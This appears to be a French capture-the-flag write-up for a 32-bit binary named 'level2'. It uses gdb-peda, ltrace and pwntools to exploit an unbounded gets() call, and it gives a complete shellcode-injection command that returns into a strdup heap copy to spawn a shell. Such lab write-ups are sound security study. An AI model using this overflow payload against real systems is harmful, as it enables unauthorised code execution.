# L3V31 D3UX

- Cet exercice est quasiment identique que le precedent. La fonction gets à une vulnerabilité car elle ne contient pas de  limite de taille.
- On regarde le nombre de caractere qu'il faut ecrire pour pouvoir overwrite la return address.

<pre>
$> gdb ./level2
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r < <(echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')

AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EBP: 0x41344141 ('AA4A')
ESP: 0xffffd8a0 ("fAA5AAKAAgAA6AAL")
<strong>EIP: 0x41414a41 ('AJAA')</strong>
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414a41 in ?? ()
gdb-peda$ pattern offset AJAA
<strong>AJAA found at offset: 80</strong>
</pre>
- On recupere l'addresse generer par le strdup qui contiendra notre shellcode
<pre>
$> python -c "print('a' * 75)" | ltrace ./level2
\_\_libc\_start\_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0
fflush(0xb7fd1a20)                                     = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)          = 0xbffff6fc
puts("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)            = 76
<strong>strdup("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)          = 0x0804a008</strong>
+++ exited (status 8) +++
</pre>

- On genere notre shellcode avec pwntool
```
$> python3 -c "import pwn; print(pwn.asm(pwn.shellcraft.sh()))"
b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
```

- Voici la commande complete
```
((python -c 'print("\x90"*20 + "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" + "A"*16 + "\x08\xa0\x04\x08")'); cat) | ./level2
```

```
| Size |      Name      | Data           |
|:----:|:--------------:|----------------|
|      |                | '\90' * 20     |
|  76  |      Stack     | ShellCode (44) |
|      |                | 'a' * 12       |
|------|----------------|----------------|
|   4  |       SFP      | 'a' * 4        |
|------|----------------|----------------|
|   4  | Return Address | Adress strdup  |
|------|----------------|----------------|
```

<table>
<tbody>
<tr>
<td align="center">Size</td>
<td align="center">Name</td>
<td align="center">Data</td>
</tr>
<tr>
<td align="center" rowspan="3">76</td>
<td align="center" rowspan="3">Buffer</td>
<td align="left">'\90' * 20</td>
</tr>
<tr><td align="left">ShellCode (44)</td></tr>
<tr><td align="left">'a' * 12</td></tr>
<tr>
<td align="center">4</td>
<td align="center">SFP</td>
<td align="left">'a' * 4</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">Return Adress</td>
<td>
<p align="left">Adress strdup</p>
</td>
</tr>
</tbody>
</table>
